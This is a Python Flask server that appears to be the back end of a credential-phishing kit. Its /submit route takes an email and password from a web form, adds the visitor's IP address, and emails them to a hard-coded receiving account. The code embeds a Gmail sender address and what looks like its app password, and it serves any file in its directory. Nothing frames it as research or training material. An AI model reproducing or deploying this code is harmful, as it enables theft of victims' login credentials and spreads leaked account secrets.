from flask import Flask, request, send_from_directory
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)

# Email configuration
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587
SENDER_EMAIL = 'nwekee125@gmail.com'
SENDER_PASSWORD = 'sgtr csgr uoju soqw'
RECEIVER_EMAIL = 'maxwell202201@gmail.com'

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/submit', methods=['POST'])
def submit():
    x1 = request.form.get('x1')
    x2 = request.form.get('x2')
    client_ip = request.remote_addr

    # Prepare email
    msg = MIMEMultipart()
    msg['From'] = SENDER_EMAIL
    msg['To'] = RECEIVER_EMAIL
    msg['Subject'] = 'Form Submission'

    body = f"""
    Email: {x1}
    Password: {x2}
    IP Address: {client_ip}
    """
    msg.attach(MIMEText(body, 'plain'))

    try:
        server = smtplib.SMTP_SSL(SMTP_SERVER, 465, timeout=30)
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        text = msg.as_string()
        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, text)
        server.quit()
        return {'message': 'Success'}
    except Exception as e:
        return {'message': str(e)}, 500

@app.route('/<path:filename>')
def send_static(filename):
    return send_from_directory('.', filename)

if __name__ == '__main__':
    app.run(debug=True)
